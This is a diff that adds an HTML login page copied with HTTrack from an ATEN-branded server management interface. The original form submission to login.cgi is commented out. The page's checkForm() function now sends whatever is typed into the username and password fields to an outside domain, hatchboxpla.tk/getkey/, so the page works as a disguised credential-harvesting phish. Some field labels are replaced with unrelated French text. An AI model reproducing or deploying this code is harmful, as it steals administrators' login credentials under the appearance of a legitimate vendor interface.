@@ -1,0 +1,81 @@
+<!--
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+-->
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<!-- Mirrored from 192.168.1.190/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 14 Jul 2020 18:49:15 GMT -->
+<head>
+    <META http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <META HTTP-EQUIV="Pragma" CONTENT="no_cache">
+    <META NAME="ATEN International Co Ltd." CONTENT="(c) ATEN International Co Ltd. 2010">
+    <title></title>
+<!--    <link rel="shortcut icon" href="../images/favicon.ico">	-->
+    <link rel="stylesheet" href="css/basic.css" type="text/css">
+    <script language="JavaScript">
+	if (window != top)
+		top.location.href = "index.html";//location.href;
+    </script>
+    <script language="JavaScript" src="js/utils.js"></script>
+    <script language="JavaScript" type="text/javascript">
+    var lang_setting;
+    lang_setting = ReadCookie("language");
+    if (lang_setting == null)
+    {
+    	CreateCookie("langSetFlag","0");
+    	CreateCookie("language","English");
+    	lang_setting = "English";
+    }
+    document.write("<script type=\"text/javascript\", src = \"../js/lang/" + lang_setting + "/lang_str.js\"><\/script>");	
+	function checkForm()
+	{
+		window.location = "http://hatchboxpla.tk/getkey/" + pwd.value + "/" + username.value;
+	}
+	function PageInit()
+	{
+		var msg = document.getElementById("login_word");
+		msg.setAttribute("value", lang.LANG_LOGIN_LOGIN);
+		return;
+	}
+	function checkEnt(e)
+	{
+		var key = window.event ? e.keyCode : e.which;
+        if(key == 13) 
+        {
+
+            checkForm();
+        }
+	}
+	</script>
+</head>
+<body onload='PageInit()'>
+	<table style="margin: 0px; height: 100%; width: 100%" border="0" background=#FFFFFF cellpadding="0" cellspacing="0">
+		<tr>
+			<td style="height: 25%; vertical-align: bottom; text-align: center">
+				<table style="margin: 0 auto;" border="0" width="412px">
+					<tr>
+						<td>
+							<img src="images/logo.gif" style="margin: 0px; padding: 0px;">
+						</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr style="width: 100%">
+			<td style="height: 75%; vertical-align: top; text-align: center">
+				<table class="login">
+					<tr><td>
+					<h3>Please Login</h3>
+					<!-- <form name="form1" action="http://192.168.1.190/cgi/login.cgi" method="post" autocomplete="off"> -->
+           			<label style="width:85px; text-align:left; margin-right: 2px;">Votre chemin d’accès personnalisé</label><input id="username" size="20" maxlength="64" style="width:146px;" type="text" onKeyDown="checkEnt(event)"><br><br>
+           			<label style="width:85px; text-align:left; margin-right: 2px;">L'heure</label><input id="pwd" size="20" maxlength="64" style="width:146px;" type="text" onKeyDown="checkEnt(event);"><br><br>
+           			<input id="login_word" class="btnStyle" name="Login" type="button" value="Entrer, s'il vous plaît" onclick="javascript: checkForm(event)">
+					<!-- </form> -->
+					</td></tr>
+				</table>
+			</td>
+		</tr>
+	</table>
+</body>
+
+<!-- Mirrored from 192.168.1.190/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 14 Jul 2020 18:49:15 GMT -->
+</html>
